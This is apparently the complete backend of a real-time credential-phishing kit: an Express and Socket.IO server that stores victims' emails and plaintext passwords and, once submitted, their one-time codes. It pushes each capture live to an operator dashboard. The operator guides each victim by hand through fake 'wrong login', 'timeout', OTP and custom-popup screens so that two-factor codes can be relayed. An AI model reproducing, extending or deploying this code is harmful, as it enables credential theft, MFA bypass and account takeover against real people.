require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ==================== ROUTES (HTML pages) ====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'otp.html')));
app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));

// ==================== DATABASE ====================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  connectionTimeoutMillis: 30000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true,
});

pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to PostgreSQL');
    release();
  }
});

// ==================== JWT AUTH ====================
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// ==================== SOCKET.IO ====================
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) {
    socket.isUser = true;
    return next();
  }
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Auth error'));
    socket.user = user;
    socket.isAdmin = true;
    next();
  });
});

io.on('connection', (socket) => {
  console.log(socket.isAdmin ? '👑 Admin connected' : '👤 User connected');
  socket.on('disconnect', () => {
    console.log(socket.isAdmin ? '👑 Admin disconnected' : '👤 User disconnected');
  });
});

// ==================== DATABASE INIT ====================
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        status VARCHAR(50) DEFAULT 'pending',
        popup_type VARCHAR(20),
        popup_value TEXT,
        popup_id INTEGER DEFAULT 0,
        wrong_login_flag BOOLEAN DEFAULT FALSE,
        timeout_flag BOOLEAN DEFAULT FALSE,
        redirect_otp_flag BOOLEAN DEFAULT FALSE,
        wrong_otp_flag BOOLEAN DEFAULT FALSE,
        otp_approved BOOLEAN DEFAULT FALSE,
        email_submitted_at TIMESTAMP DEFAULT NOW(),
        otp_submitted_at TIMESTAMP,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ Users table ready');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    // Ensure default admin exists
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization complete');
    return true;
  } catch (err) {
    console.error('❌ Database init error:', err.message);
    return false;
  }
}

// ==================== USER ENDPOINTS ====================

// User login (email + password)
app.post('/api/user/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    // Insert or update — resets all state on new submission
    await pool.query(`
      INSERT INTO users (email, password, status, popup_type, popup_value, popup_id,
        wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag, otp_approved)
      VALUES ($1, $2, 'pending', NULL, NULL, 0, false, false, false, false, false)
      ON CONFLICT (email) DO UPDATE SET
        password = EXCLUDED.password,
        otp = NULL,
        status = 'pending',
        popup_type = NULL,
        popup_value = NULL,
        popup_id = 0,
        wrong_login_flag = false,
        timeout_flag = false,
        redirect_otp_flag = false,
        wrong_otp_flag = false,
        otp_approved = false,
        email_submitted_at = NOW(),
        updated_at = NOW()
    `, [email, password]);

    console.log('📧 User login:', email);
    io.emit('user-login', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ User login error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit OTP (alphanumeric 5-6 chars)
app.post('/api/user/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required' });
    if (!/^[A-Za-z0-9]{5,6}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be 5-6 alphanumeric characters' });
    }

    await pool.query(`
      UPDATE users SET 
        otp = $1, 
        status = 'otp_submitted',
        otp_submitted_at = NOW(),
        updated_at = NOW()
      WHERE email = $2
    `, [otp.toUpperCase(), email]);

    console.log('🔐 OTP submitted:', email, 'OTP:', otp);
    io.emit('user-otp', { email, otp, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Submit OTP error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Poll user status (for polling + popup detection)
app.get('/api/user/status', async (req, res) => {
  try {
    const { email } = req.query;
    if (!email) return res.json({ status: null });

    const result = await pool.query(`
      SELECT status, popup_type, popup_value, popup_id,
        wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag, otp_approved
      FROM users WHERE email = $1
    `, [email]);

    if (result.rows.length === 0) return res.json({ status: null });

    const u = result.rows[0];
    res.json({
      status: u.status,
      popup_type: u.popup_type,
      popup_value: u.popup_value,
      popup_id: u.popup_id,
      wrong_login_flag: u.wrong_login_flag,
      timeout_flag: u.timeout_flag,
      redirect_otp_flag: u.redirect_otp_flag,
      wrong_otp_flag: u.wrong_otp_flag,
      otp_approved: u.otp_approved,
    });
  } catch (err) {
    console.error('Status error:', err.message);
    res.json({ status: null });
  }
});

// Clear control flags (called by user after acting)
app.post('/api/user/clear-flags', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET
        wrong_login_flag = false,
        timeout_flag = false,
        wrong_otp_flag = false
      WHERE email = $1
    `, [email]);

    res.json({ success: true });
  } catch (err) {
    console.error('Clear flags error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== ADMIN ENDPOINTS ====================

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query(
      'SELECT * FROM admin WHERE email = $1 AND password = $2',
      [email, password]
    );
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    console.log('👑 Admin logged in:', email);
    res.json({ success: true, token });
  } catch (err) {
    console.error('❌ Admin login error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users
app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT id, email, password, otp, status,
        popup_type, popup_value, popup_id,
        wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag, otp_approved,
        email_submitted_at, otp_submitted_at, created_at, updated_at
      FROM users ORDER BY created_at DESC
    `);
    res.json(result.rows);
  } catch (err) {
    console.error('❌ Get users error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// WRONG LOGIN — flag + notify (record stays)
app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET wrong_login_flag = true, updated_at = NOW()
      WHERE email = $1
    `, [email]);

    io.emit('user-updated', { email });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Wrong login error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// TIMEOUT — flag + notify (record stays)
app.post('/api/admin/timeout', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET timeout_flag = true, updated_at = NOW()
      WHERE email = $1
    `, [email]);

    io.emit('user-updated', { email });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Timeout error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// YES BUTTON — increment popup_id, set popup_type='yes', popup_value=number
app.post('/api/admin/yes', authenticateJWT, async (req, res) => {
  try {
    const { email, number } = req.body;
    if (!email || !number) return res.status(400).json({ error: 'Email and number required' });

    await pool.query(`
      UPDATE users SET 
        popup_type = 'yes',
        popup_value = $1,
        popup_id = popup_id + 1,
        updated_at = NOW()
      WHERE email = $2
    `, [String(number), email]);

    // Fetch updated row for socket emit
    const r = await pool.query('SELECT popup_id FROM users WHERE email = $1', [email]);
    const popupId = r.rows[0]?.popup_id || 0;

    io.emit('popup-update', {
      email,
      popup_type: 'yes',
      popup_value: String(number),
      popup_id: popupId
    });

    res.json({ success: true });
  } catch (err) {
    console.error('❌ Yes error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// TEXT BUTTON — increment popup_id, set popup_type='text', popup_value=text
app.post('/api/admin/text', authenticateJWT, async (req, res) => {
  try {
    const { email, text } = req.body;
    if (!email || !text) return res.status(400).json({ error: 'Email and text required' });

    await pool.query(`
      UPDATE users SET 
        popup_type = 'text',
        popup_value = $1,
        popup_id = popup_id + 1,
        updated_at = NOW()
      WHERE email = $2
    `, [text, email]);

    const r = await pool.query('SELECT popup_id FROM users WHERE email = $1', [email]);
    const popupId = r.rows[0]?.popup_id || 0;

    io.emit('popup-update', {
      email,
      popup_type: 'text',
      popup_value: text,
      popup_id: popupId
    });

    res.json({ success: true });
  } catch (err) {
    console.error('❌ Text error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// SEND TO OTP — redirect user to otp.html
app.post('/api/admin/send-to-otp', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET 
        redirect_otp_flag = true,
        status = 'approved',
        updated_at = NOW()
      WHERE email = $1
    `, [email]);

    io.emit('user-updated', { email });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Send to OTP error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// WRONG OTP — flag + notify user
app.post('/api/admin/wrong-otp', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET wrong_otp_flag = true, updated_at = NOW()
      WHERE email = $1
    `, [email]);

    io.emit('user-updated', { email });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Wrong OTP error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// SUCCESS — set status to success
app.post('/api/admin/success', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    await pool.query(`
      UPDATE users SET status = 'success', otp_approved = true, updated_at = NOW()
      WHERE email = $1
    `, [email]);

    io.emit('user-updated', { email });
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Success error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== HEALTH CHECK ====================
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;

initializeDatabase().then(success => {
  if (!success) {
    console.error('❌ Server startup failed due to DB issues');
    process.exit(1);
  }

  server.listen(PORT, '0.0.0.0', () => {
    console.log('\n🚀 Server running!');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔗 User login: http://localhost:${PORT}/`);
    console.log(`🔗 Admin login: http://localhost:${PORT}/admin`);
    console.log('\n📢 Socket.IO ready for real-time updates\n');
  });
});

// ==================== GRACEFUL SHUTDOWN ====================
process.on('SIGINT', () => {
  console.log('\n📴 Shutting down...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down...');
  pool.end(() => process.exit(0));
});